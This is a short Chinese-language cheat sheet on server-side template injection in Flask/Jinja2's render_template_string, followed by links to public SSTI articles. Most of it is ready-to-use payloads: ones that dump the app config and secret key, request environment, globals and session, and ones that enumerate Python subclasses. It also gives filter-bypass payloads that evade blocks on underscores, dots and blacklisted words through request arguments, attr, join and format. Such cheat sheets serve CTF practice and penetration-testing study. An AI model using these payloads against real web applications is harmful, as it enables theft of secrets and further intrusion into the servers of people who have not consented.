# 服务端模板注入

Server Side Template Injection

## render_template_string()

flask中自带函数

可以套出flask中相关变量

### payloads:

* `{{ config }}`
    * 获取Secret Key
* `{{ request.environ }}`
    * 服务器信息
* `{{ url_for.__globals__}}`
    * 全局函数中的好东西
* `{{url_for.__globals__['current_app'].config}}`
    * 同第一个
* `{{session}}`
    * session对象
* `{{ [].class.base.subclasses() }}`
* `{{''.class.mro()[1].subclasses()}}`
    * 获取所有类

更多见~~待填坑的~~Python jail

### 绕过

* `_`
    * `exploit={{request[request.args.param]}}&param=__class__`
* `.` 或`[]`
    * 使用jinja2 filters `|attr()`
    * `exploit={{request|attr(request.args.param)}}&param=__class__`
    * `__getitem__()`
* 黑名单词绕过
    * 用join`exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_`
    * 用format`exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_`



## Reference

* https://www.freebuf.com/articles/web/98619.html
* https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
* http://jinja.pocoo.org/docs/dev/templates/#builtin-globals
* https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html
* https://portswigger.net/blog/server-side-template-injection